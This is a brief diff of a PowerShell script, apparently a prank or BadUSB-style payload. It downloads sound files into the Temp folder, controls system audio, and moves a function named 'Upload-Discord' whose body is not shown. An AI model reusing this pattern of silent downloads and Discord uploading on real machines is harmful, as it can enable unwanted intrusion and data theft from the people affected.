@@ -2,7 +2,6 @@ Set-Location $env:Temp; Invoke-WebRequest https://raw.githubusercontent.com/Frai
 Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound2.wav -O sound2.wav -UseBasicParsing
 Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound3.wav -O sound3.wav -UseBasicParsing
 
-function Upload-Discord {
 
 Add-Type -TypeDefinition @'
 using System.Runtime.InteropServices;
@@ -55,7 +54,7 @@ public class Audio
 }
 '@
 
-
+function Upload-Discord {
   [CmdletBinding()]
   param (
       [parameter(Position=0,Mandatory=$False)]
